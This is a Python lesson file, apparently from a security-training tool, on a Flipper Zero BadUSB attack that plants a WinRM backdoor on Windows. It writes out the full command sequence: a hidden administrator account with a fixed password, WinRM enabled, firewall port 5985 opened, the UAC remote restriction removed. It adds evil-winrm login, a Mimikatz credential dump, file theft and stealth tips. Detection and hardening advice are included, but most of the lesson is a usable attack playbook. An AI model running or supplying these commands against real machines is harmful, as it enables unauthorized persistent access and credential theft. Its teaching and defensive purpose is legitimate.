#!/usr/bin/env python3
"""
ERR0RS — BadUSB / Physical Access Lesson Pack
Source: nocomp/Flipper_Zero_Badusb_hack5_payloads + I-Am-Jakoby + ERR0RS purple team

Covers: WinRM backdoor, credential grabbing, exfiltration payloads,
        UAC bypass, persistence via BadUSB/HID attack

Author: Gary Holden Schneider (Eros) | ERR0RS-Ultimate
"""

BADUSB_LESSONS = {

  # ══════════════════════════════════════════════════════════════════════════
  # WINRM BACKDOOR — PLAIN ENGLISH BREAKDOWN
  # ══════════════════════════════════════════════════════════════════════════

  "winrm backdoor": {
    "title": "WinRM Backdoor — BadUSB Persistence Attack",
    "tldr": (
      "Plug in a Flipper Zero for 10 seconds → walk away with permanent "
      "remote admin access to the Windows machine from anywhere on the network."
    ),
    "what": (
      "PLAIN ENGLISH — What is this attack?\n\n"
      "Imagine a USB stick that pretends to be a keyboard. The moment you plug it in,\n"
      "Windows trusts it completely — no questions asked, no warnings shown.\n\n"
      "The Flipper Zero (or any BadUSB device) then 'types' a sequence of commands\n"
      "faster than any human could — in about 10 seconds — that:\n\n"
      "  1. Creates a secret admin account on the computer\n"
      "     → Think of it like making a copy of the front door key\n\n"
      "  2. Turns on Windows' built-in remote shell service (WinRM)\n"
      "     → Like installing a backdoor that lets you log in from across the building\n\n"
      "  3. Opens a hole in the Windows Firewall for that backdoor\n"
      "     → Like unlocking a window so the back door can be reached\n\n"
      "  4. Disables a security feature that normally blocks remote admin access (UAC)\n"
      "     → Like removing the deadbolt from the back door\n\n"
      "  5. Hides the new account from the login screen\n"
      "     → So the real user never sees anything unusual\n\n"
      "After unplugging and walking away, the attacker can connect to that machine\n"
      "from any computer on the same network — getting full administrator control\n"
      "without ever touching the machine again."
    ),
    "how": (
      "HOW THE PAYLOAD WORKS — Step by step:\n\n"
      "STAGE 1 — Open a hidden command prompt (lines 1-7 of payload)\n"
      "  The Flipper types: Windows Key + R  →  opens the Run dialog\n"
      "  Types: cmd  →  selects the command prompt\n"
      "  Hits Ctrl+Shift+Enter  →  opens it as Administrator\n"
      "  Hits Left Arrow + Enter  →  accepts the UAC security prompt\n"
      "  All of this happens in a hidden window — the user sees nothing\n\n"
      "STAGE 2 — Create the backdoor account (lines 8-10)\n"
      "  NET USER RD_User RD_P@ssW0rD /ADD\n"
      "    → Creates a new Windows user called RD_User with password RD_P@ssW0rD\n"
      "  NET LOCALGROUP Administrators RD_User /ADD\n"
      "    → Makes RD_User a full administrator\n\n"
      "STAGE 3 — Enable remote access (lines 11-15)\n"
      "  WINRM QUICKCONFIG\n"
      "    → Turns on Windows Remote Management — the built-in remote shell\n"
      "  NETSH ADVFIREWALL FIREWALL ADD RULE ...\n"
      "    → Opens port 5985 in the firewall so connections can reach WinRM\n\n"
      "STAGE 4 — Remove security restrictions (lines 16-19)\n"
      "  REG ADD ... LocalAccountTokenFilterPolicy ... /d 1\n"
      "    → Disables UAC's remote restrictions so RD_User has full admin power remotely\n"
      "  REG ADD ... SpecialAccounts\\UserList ... RD_User /d 0\n"
      "    → Hides RD_User from the Windows login screen\n\n"
      "EXPLOITATION — How attacker connects later:\n"
      "  evil-winrm --ip TARGET_IP --user RD_User --password 'RD_P@ssW0rD'\n"
      "  → Full PowerShell administrator shell — can run any command, steal files,\n"
      "    dump passwords, install software, pivot to other machines"
    ),
    "phases": [
      "1. PHYSICAL ACCESS — Plug Flipper Zero into unlocked/unattended Windows machine",
      "2. PAYLOAD FIRES   — DuckyScript auto-runs: account + WinRM + firewall + registry (~10s)",
      "3. UNPLUG & LEAVE  — Machine is now permanently backdoored, no trace on screen",
      "4. REMOTE CONNECT  — evil-winrm --ip TARGET --user RD_User --password 'RD_P@ssW0rD'",
      "5. POST-EXPLOIT    — Full admin shell: dump creds, pivot network, install persistence",
      "6. CLEANUP         — net user RD_User /delete && Disable-PSRemoting -Force",
    ],
    "commands": {
      "Load onto Flipper":         "Copy payload to SD:/badusb/WinRM-Backdoor.txt",
      "Fire payload (Flipper)":    "Flipper → BadUSB → WinRM-Backdoor → Run",
      "Connect remotely":          "evil-winrm --ip TARGET_IP --user RD_User --password 'RD_P@ssW0rD'",
      "Confirm access":            "whoami  →  should show: desktop-xxxx\\rd_user",
      "Dump password hashes":      "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
      "Upload file to target":     "upload /path/to/local/file.exe",
      "Download file from target": "download C:\\Users\\victim\\Documents\\passwords.txt",
      "Enable RDP for GUI access": "Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' fDenyTSConnections 0",
      "Check who else is on box":  "net user && query user",
      "Pivot — scan internal net": "Test-NetConnection -ComputerName 192.168.1.1 -Port 445",
      "Cleanup — remove user":     "net user RD_User /delete",
      "Cleanup — disable WinRM":   "Disable-PSRemoting -Force",
      "Manual PowerShell version": (
        "net user RD_User RD_P@ssW0rD /add\n"
        "net localgroup administrators RD_User /add\n"
        "Enable-PSRemoting -Force\n"
        "netsh advfirewall firewall add rule name='WinRM' protocol=TCP dir=in localport=5985 action=allow\n"
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n"
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v RD_User /t REG_DWORD /d 0 /f"
      ),
    },
    "flags": {
      "evil-winrm --ip":           "Target machine's IP address",
      "evil-winrm --user":         "Backdoor username (RD_User)",
      "evil-winrm --password":     "Backdoor password (RD_P@ssW0rD)",
      "evil-winrm --ssl":          "Use encrypted HTTPS connection (port 5986)",
      "WINRM QUICKCONFIG":         "Windows command that enables the remote shell service",
      "LocalAccountTokenFilterPolicy=1": "Registry key that removes UAC restriction from remote admin logins",
      "SpecialAccounts\\UserList": "Registry key that hides accounts from the login screen",
      "Port 5985":                 "HTTP WinRM port — the unencrypted remote shell port",
      "Port 5986":                 "HTTPS WinRM port — encrypted version",
    },
    "defense": (
      "PHYSICAL DEFENSES (stop the attack before it starts):\n"
      "  ✅ Lock your screen when you walk away — Win+L takes 1 second\n"
      "  ✅ Disable USB ports in BIOS for workstations that don't need them\n"
      "  ✅ Use USB device whitelisting — only allow known authorized USB devices\n"
      "  ✅ Physical security — don't leave workstations unattended in public areas\n\n"
      "DETECTION (catch it after it fires):\n"
      "  ✅ Alert on EventID 4720 — New user account created\n"
      "  ✅ Alert on EventID 4732 — User added to Administrators group\n"
      "  ✅ Alert on EventID 4104 — PowerShell ScriptBlock: 'Enable-PSRemoting'\n"
      "  ✅ Alert on registry write to LocalAccountTokenFilterPolicy\n"
      "  ✅ Alert on new WinRM connections (EventID 4624 LogonType 3 on port 5985)\n"
      "  ✅ EDR behavioral rule: cmd.exe spawning net.exe + winrm in same session\n\n"
      "HARDENING (reduce attack surface):\n"
      "  ✅ Disable WinRM on workstations that don't need it\n"
      "  ✅ Require Kerberos auth for WinRM (not local accounts)\n"
      "  ✅ Firewall — block port 5985/5986 internally unless explicitly needed\n"
      "  ✅ AppLocker / WDAC — prevent net.exe and winrm.cmd from running via USB trigger\n"
      "  ✅ Privileged Access Workstations (PAW) — admin tasks only from hardened machines"
    ),
    "tips": [
      "This attack requires the target user to be logged in as an admin — most office workers are",
      "The hidden window technique means victims see nothing — no pop-ups, no command prompt flash",
      "WinRM is a LEGITIMATE Windows feature — most AV/EDR doesn't flag it at all",
      "The account survives reboots — this is persistent access, not just a session",
      "evil-winrm gives you full PowerShell including file upload/download built in",
      "Combine with Mimikatz post-exploit to dump domain credentials and own the whole network",
      "Change the default RD_User/RD_P@ssW0rD to something less obvious in red team ops",
      "For stealth: use a longer DELAY value in the payload to wait for slow machines",
      "MITRE ATT&CK chain: T1200 (BadUSB) → T1136 (Create Account) → T1021.006 (WinRM) → T1078 (Valid Accounts)",
    ],
    "mitre": "T1200 → T1136.001 → T1098 → T1021.006 → T1562.004 → T1564.002",
  },

  # ── Aliases ───────────────────────────────────────────────────────────────
  "winrm":               "winrm backdoor",
  "winrm persistence":   "winrm backdoor",
  "evil-winrm":          "winrm backdoor",
  "badusb winrm":        "winrm backdoor",
  "rd_user":             "winrm backdoor",
  "windows remote management": "winrm backdoor",
  "hid attack winrm":    "winrm backdoor",
  "badusb":              "winrm backdoor",
  "bad usb":             "winrm backdoor",
  "hid attack":          "winrm backdoor",
  "rubber ducky":        "winrm backdoor",
  "duckyscript":         "winrm backdoor",
  "keystroke injection": "winrm backdoor",
  "flipper badusb":      "winrm backdoor",
  "usb attack":          "winrm backdoor",
}

_BADUSB_ALIASES = {
    "winrm":                     "winrm backdoor",
    "winrm persistence":         "winrm backdoor",
    "evil-winrm":                "winrm backdoor",
    "badusb winrm":              "winrm backdoor",
    "rd_user":                   "winrm backdoor",
    "windows remote management": "winrm backdoor",
    "hid attack winrm":          "winrm backdoor",
    # route generic BadUSB queries to the WinRM lesson as the most complete example
    "badusb":                    "winrm backdoor",
    "bad usb":                   "winrm backdoor",
    "hid attack":                "winrm backdoor",
    "rubber ducky":              "winrm backdoor",
    "duckyscript":               "winrm backdoor",
    "keystroke injection":       "winrm backdoor",
    "flipper badusb":            "winrm backdoor",
    "usb attack":                "winrm backdoor",
}

def resolve_badusb_lesson(keyword: str):
    """Resolve aliases and return correct BADUSB_LESSONS entry."""
    kw = keyword.lower().strip()
    kw = _BADUSB_ALIASES.get(kw, kw)
    lesson = BADUSB_LESSONS.get(kw)
    if isinstance(lesson, str):
        lesson = BADUSB_LESSONS.get(lesson)
    if lesson and isinstance(lesson, dict) and lesson.get("what"):
        return lesson
    for key, val in BADUSB_LESSONS.items():
        if key and isinstance(val, dict) and val.get("what") and key in kw:
            return val
    return None
